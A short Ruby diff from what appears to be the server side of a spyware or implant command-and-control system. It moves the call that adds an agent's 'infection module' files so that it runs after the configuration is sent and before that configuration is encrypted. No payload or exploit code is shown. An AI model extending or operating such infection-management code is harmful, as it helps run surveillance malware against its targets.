@@ -298,9 +298,6 @@ class AgentController < RESTController
         agent.save
       end
 
-      # add the files needed for the infection module
-      agent.add_infection_files
-
       status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id]}
       return ok(status)
     end
@@ -372,6 +369,9 @@ class AgentController < RESTController
         # we have sent the configuration, wait for activation
         config.sent = Time.now.getutc.to_i
         config.save
+
+        # add the files needed for the infection module
+        agent.add_infection_files
 
         # encrypt the config for the agent using the confkey
         enc_config = config.encrypted_config(agent[:confkey])
